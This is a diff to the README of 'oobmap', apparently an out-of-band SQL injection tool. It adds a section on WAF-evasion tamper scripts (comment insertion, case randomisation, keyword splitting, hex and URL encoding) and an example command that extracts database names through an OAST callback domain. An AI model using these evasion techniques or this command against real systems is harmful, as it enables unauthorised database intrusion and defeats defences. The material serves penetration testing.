@@ -373,6 +373,53 @@ Metadata enumeration uses DBMS-specific catalog queries:
 - Oracle: `all_tables`, `all_tab_columns`
 - SQLite HTTP profile: `sqlite_master` for table names
 
+## WAF Bypass / Tampers
+
+`oobmap` can rewrite generated payloads through a chain of tamper scripts,
+similar in spirit to sqlmap's `--tamper`. Tampers are opt-in and explicit —
+`oobmap` never applies one without you naming it.
+
+List available tampers:
+
+```bash
+oobmap tampers
+```
+
+Current tampers:
+
+| Tamper | Effect |
+|---|---|
+| `inline-comments` | Replace spaces with `/**/` |
+| `randomize-case` | Randomly capitalize SQL keywords |
+| `between-comments` | Split keywords mid-word: `SEL/**/ECT` |
+| `hex-encode-strings` | Convert `'string'` literals to `0x` hex |
+| `double-url-encode` | Double URL-encode the full payload |
+| `url-encode` | URL-encode the full payload once |
+| `space2randomblank` | Replace spaces with a random whitespace character (tab/newline/etc.) |
+
+Chain multiple tampers with a comma-separated list, applied in order:
+
+```bash
+oobmap -r req.txt -p TrackingId --dbms mssql \
+  --domain abc123.oast.site --log interactsh.jsonl \
+  --expr "SELECT DB_NAME()" \
+  --tamper inline-comments,randomize-case
+```
+
+### Compatibility warnings
+
+Some tampers only produce valid syntax for specific DBMS dialects.
+`hex-encode-strings` rewrites `'string'` literals into bare `0x<hex>`
+literals — valid in MySQL and MSSQL, but a syntax error in PostgreSQL,
+SQLite, and Oracle. When you combine `--tamper hex-encode-strings` with an
+incompatible `--dbms` profile, `oobmap` prints a warning and still runs —
+it stays your call whether to proceed:
+
+```text
+[WARNING] tamper 'hex-encode-strings' emits bare 0x<hex> literals, valid only
+          in MySQL/MSSQL — likely to break query syntax for --dbms postgres-program.
+```
+
 ## How Extraction Works
 
 For every character position, `oobmap` sends the whole alphabet in a batch.
@@ -465,7 +512,6 @@ Not implemented yet:
 
 - full `--dbs` enumeration and multi-schema selection;
 - CSV/JSON dump output files;
-- WAF bypass/tamper scripts;
 - DBMS fingerprinting;
 - boolean/time/error/UNION exploitation;
 - advanced persistent run cache UI.
